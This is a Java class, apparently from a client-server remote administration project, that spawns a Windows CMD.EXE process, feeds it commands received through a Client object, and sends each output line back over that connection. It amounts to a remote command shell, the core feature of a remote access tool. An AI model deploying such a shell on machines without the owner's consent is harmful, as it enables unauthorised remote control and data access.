/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package Client;

import Logger.Logger;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

/**
 *
 * @author adrie
 */
public class CommandPrompt implements Runnable{
    private boolean running = false;
    
    private Client client;
    
    private Process process;
    private BufferedReader stdout;
    private BufferedReader stderr;
    private BufferedWriter stdin;
    
    private final Logger logger = new Logger();

    public CommandPrompt(Client client) {
        this.client = client;
    }
    
    public void start() throws IOException{
        this.stop();
        this.process = Runtime.getRuntime().exec("CMD.EXE");
        this.stdout = new BufferedReader(new InputStreamReader(this.process.getInputStream()));
        this.stderr = new BufferedReader(new InputStreamReader(this.process.getErrorStream()));
        this.stdin = new BufferedWriter(new OutputStreamWriter(this.process.getOutputStream()));

        new Thread(this).start();
    }
    
    public void stop(){
        if (this.process != null && this.process.isAlive()){
            this.process.destroy();
        }
    }
    
    public void execute(String command){
        try{
        
            if (!this.running){
                this.start();
            }

            this.stdin.write(command);
            this.stdin.newLine();
            this.stdin.flush();

        } catch (IOException ex){
            logger.log("Start command prompt EXCEPTION : " + ex);
        }
    }
    
    @Override
    public void run() {
        String line;
        
        
        this.running = true;
        logger.log("DEBUT EXECUTE");
        this.client.sendMessage("DEBUT EXECUTE");
        try{
            while (true){
                line = this.stdout.readLine();
                if (line == null){
                    break;
                }
                
                logger.log(line);
                this.client.sendMessage(line);
            }
        } catch (IOException ex) {
            logger.log(ex.getMessage());
        }
        
        logger.log("FIN EXECUTE");
        this.client.sendMessage("FIN EXECUTE");
        this.running = false;
    }
    
    
}
